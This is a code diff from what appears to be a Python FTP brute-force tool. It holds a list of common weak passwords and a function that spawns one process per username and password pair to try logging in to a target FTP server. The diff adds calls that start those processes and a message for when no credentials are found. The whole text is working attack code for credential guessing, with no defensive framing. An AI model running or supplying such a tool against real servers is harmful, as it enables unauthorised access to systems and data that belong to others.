@@ -14,7 +14,6 @@ common_ftp_passwords = [
     '', ' ', 'password','123456','admin','12345','12345678','qwerty','1234567','123456789','1234','password1','abc123','letmein','password123','changeme','123123','login','welcome','test123','ftp123'
 ]
 
-
 def ftp_connect(server, port, username, password):
     try:
         # Connect to the FTP server on the specified port
@@ -42,8 +41,10 @@ def ftp_connect(server, port, username, password):
 def ftp_brute(ip, port):
     procs = []
     tested_creds = []
+    creds_found =False
 
     for username in common_ftp_users:
+
         for password in get_usernames_esr(username):
             current_creds = f'{username}:{password}'
             if current_creds in tested_creds:
@@ -51,6 +52,7 @@ def ftp_brute(ip, port):
             tested_creds.append(current_creds)
 
             process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
+            process.start()
             procs.append(process)
         for password in common_ftp_passwords:
             current_creds = f'{username}:{password}'
@@ -60,8 +62,11 @@ def ftp_brute(ip, port):
             
             # Start processes to execute
             process = multiprocessing.Process(target=ftp_connect, args=(ip, port, username, password))
+            process.start()
             procs.append(process)
     procs = launch_procs(procs)
+    if creds_found == False:
+        printc('[-] No common credentials combination found.', RED)
 
 
 def print_this_banner(port):
